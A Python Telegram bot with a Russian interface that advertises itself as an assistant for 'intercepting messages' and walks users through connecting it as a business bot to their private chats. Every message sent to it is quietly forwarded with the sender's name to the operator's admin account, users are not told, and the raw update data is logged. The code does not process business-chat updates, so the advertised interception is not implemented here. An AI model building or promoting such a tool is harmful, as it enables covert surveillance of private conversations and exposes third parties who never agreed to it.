import os
import json
import asyncio
from aiohttp import web
import aiohttp
from datetime import datetime
import time

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
OWNER_USERNAME = "black_ide"
DATA_FILE = "stats.json"

if not BOT_TOKEN or not ADMIN_ID:
    raise ValueError("BOT_TOKEN и ADMIN_ID обязательны")

# ============ РАБОТА С ФАЙЛОМ ============
def load_stats():
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        # Если файла нет — создаём начальные данные
        default = {
            "total_messages": 0,
            "active_chats": [],
            "start_time": datetime.now().isoformat(),
            "last_reset": datetime.now().isoformat()
        }
        save_stats(default)
        return default

def save_stats(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

stats = load_stats()
last_save_time = time.time()

# ============ КЛАВИАТУРЫ ============
MAIN_KEYBOARD = {
    "inline_keyboard": [
        [
            {"text": "📊 Статистика", "callback_data": "stats"},
            {"text": "👤 Помощь", "callback_data": "help"}
        ],
        [
            {"text": "⚙️ Настройки", "callback_data": "settings"},
            {"text": "📩 Связаться с админом", "url": f"https://t.me/{OWNER_USERNAME}"}
        ],
        [
            {"text": "🔗 Подключить бота", "callback_data": "connect"}
        ]
    ]
}

CONNECT_KEYBOARD = {
    "inline_keyboard": [
        [
            {"text": "📋 Скопировать юзернейм", "callback_data": "copy_username"}
        ],
        [
            {"text": "❌ Закрыть", "callback_data": "cancel"}
        ]
    ]
}

# ============ ФУНКЦИИ ОТПРАВКИ ============
async def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload) as resp:
            return await resp.json()

async def answer_callback(callback_id, text, show_alert=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id, "text": text, "show_alert": show_alert}
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload) as resp:
            return await resp.json()

# ============ ВЕБХУК ============
async def handle_webhook(request):
    global stats, last_save_time
    try:
        data = await request.json()
        print(f"📥 Получен запрос: {json.dumps(data, indent=2)}")
        
        if "message" in data:
            message = data["message"]
            chat_id = message["chat"]["id"]
            user = message.get("from", {})
            text = message.get("text", "")
            username = user.get("username", "без юзера")
            full_name = user.get("first_name", "") + " " + user.get("last_name", "")
            
            # Обновляем статистику
            stats["total_messages"] += 1
            if chat_id not in stats["active_chats"]:
                stats["active_chats"].append(chat_id)
            
            # Сохраняем каждые 10 сообщений или раз в 30 секунд
            if stats["total_messages"] % 10 == 0 or time.time() - last_save_time > 30:
                save_stats(stats)
                last_save_time = time.time()
            
            # Отправляем копию админу (если это не сам админ)
            if chat_id != ADMIN_ID:
                await send_message(
                    ADMIN_ID,
                    f"📩 От: {full_name} (@{username})\n\n{text}"
                )
            
            # Обработка команд
            if text == "/start":
                welcome_text = (
                    f"👋 *Привет, {full_name}!*\n\n"
                    "Я — *помощник для перехвата сообщений*.\n"
                    "Подключи меня как бизнес-бота, и я буду пересылать тебе все сообщения из чатов.\n\n"
                    "👇 Выбери действие:"
                )
                await send_message(chat_id, welcome_text, MAIN_KEYBOARD)
            else:
                await send_message(chat_id, "✅ Сообщение получено! Выбери действие в меню.", MAIN_KEYBOARD)
        
        elif "callback_query" in data:
            callback = data["callback_query"]
            callback_id = callback["id"]
            chat_id = callback["message"]["chat"]["id"]
            data_callback = callback.get("data", "")
            user = callback.get("from", {})
            username = user.get("username", "без юзера")
            is_admin = chat_id == ADMIN_ID
            
            print(f"🔄 Нажата кнопка: {data_callback} от @{username}")
            
            # ===== СТАТИСТИКА =====
            if data_callback == "stats":
                if is_admin:
                    stats_text = (
                        f"📊 *Статистика бота*\n\n"
                        f"📨 Всего сообщений: {stats['total_messages']}\n"
                        f"👥 Активных чатов: {len(stats['active_chats'])}\n"
                        f"⏱ Запущен: {stats['start_time']}\n"
                        f"🆔 Ваш ID: {chat_id}"
                    )
                else:
                    stats_text = (
                        "📊 *Статистика бота*\n\n"
                        "✅ Бот работает и обрабатывает сообщения.\n"
                        "Подробная статистика доступна только админу."
                    )
                await send_message(chat_id, stats_text, MAIN_KEYBOARD)
                await answer_callback(callback_id, "📊 Статистика показана")
            
            # ===== ПОМОЩЬ =====
            elif data_callback == "help":
                help_text = (
                    "👤 *Помощь*\n\n"
                    "🤖 *Что умеет бот:*\n"
                    "• Перехватывает сообщения из чатов\n"
                    "• Пересылает копии админу\n"
                    "• Отвечает в чатах, куда подключен\n\n"
                    "🔗 *Как подключить:*\n"
                    "• Настройки Telegram → Бизнес-боты\n"
                    "• Добавить @ne_otvechu_bot\n"
                    "• Выбрать чаты для перехвата\n\n"
                    "📩 *Связь с админом:* @black_ide"
                )
                await send_message(chat_id, help_text, MAIN_KEYBOARD)
                await answer_callback(callback_id, "👤 Помощь открыта")
            
            # ===== НАСТРОЙКИ =====
            elif data_callback == "settings":
                if is_admin:
                    settings_text = (
                        "⚙️ *Настройки бота*\n\n"
                        "Доступные настройки (только для админа):\n"
                        "• Режим работы: активен\n"
                        "• Пересылка сообщений: включена\n"
                        "• Уведомления: включены\n\n"
                        f"📊 Сообщений обработано: {stats['total_messages']}\n"
                        f"👥 Активных чатов: {len(stats['active_chats'])}\n\n"
                        "_Для сброса статистики удали stats.json на Railway_"
                    )
                else:
                    settings_text = "⚙️ Настройки доступны только админу."
                await send_message(chat_id, settings_text, MAIN_KEYBOARD)
                await answer_callback(callback_id, "⚙️ Настройки")
            
            # ===== ПОДКЛЮЧИТЬ БОТА =====
            elif data_callback == "connect":
                connect_text = (
                    "🔗 *Как подключить бота:*\n\n"
                    "1. Открой *Настройки Telegram* → *Бизнес-боты*\n"
                    "2. Нажми *Добавить* и введи: *@ne_otvechu_bot*\n"
                    "3. Выбери *Все личные чаты* или *Только выбранные*\n"
                    "4. Готово! Бот начнёт перехватывать сообщения.\n\n"
                    "📋 Нажми кнопку ниже, чтобы скопировать юзернейм."
                )
                await send_message(chat_id, connect_text, CONNECT_KEYBOARD)
                await answer_callback(callback_id, "🔗 Инструкция открыта")
            
            # ===== КОПИРОВАТЬ ЮЗЕРНЕЙМ =====
            elif data_callback == "copy_username":
                username_msg = (
                    "📋 *Юзернейм бота:*\n"
                    "`@ne_otvechu_bot`\n\n"
                    "Нажми и удерживай, чтобы скопировать."
                )
                await send_message(chat_id, username_msg, MAIN_KEYBOARD)
                await answer_callback(callback_id, "📋 Юзернейм показан")
            
            # ===== ОТМЕНА =====
            elif data_callback == "cancel":
                await send_message(chat_id, "❌ Действие отменено.", MAIN_KEYBOARD)
                await answer_callback(callback_id, "❌ Отменено")
            
            else:
                await answer_callback(callback_id, "⚠️ Неизвестная команда")
        
        else:
            print(f"⚠️ Другой тип обновления: {list(data.keys())}")
            
    except Exception as e:
        print(f"❌ Ошибка: {e}")
    
    return web.Response(text="OK")

# ============ ЗАПУСК ============
async def on_startup():
    WEBHOOK_URL = os.getenv("WEBHOOK_URL")
    if WEBHOOK_URL:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={WEBHOOK_URL}&drop_pending_updates=true"
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                result = await resp.json()
                if result.get("ok"):
                    print(f"✅ Вебхук установлен: {WEBHOOK_URL}")
                else:
                    print(f"❌ Ошибка: {result}")

app = web.Application()
app.router.add_post("/webhook", handle_webhook)
app.router.add_get("/", lambda request: web.Response(text="I'm alive ✅"))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(on_startup())
    print(f"🚀 Запуск на порту {port}...")
    print(f"📊 Статистика загружена: {stats['total_messages']} сообщений")
    web.run_app(app, host="0.0.0.0", port=port)
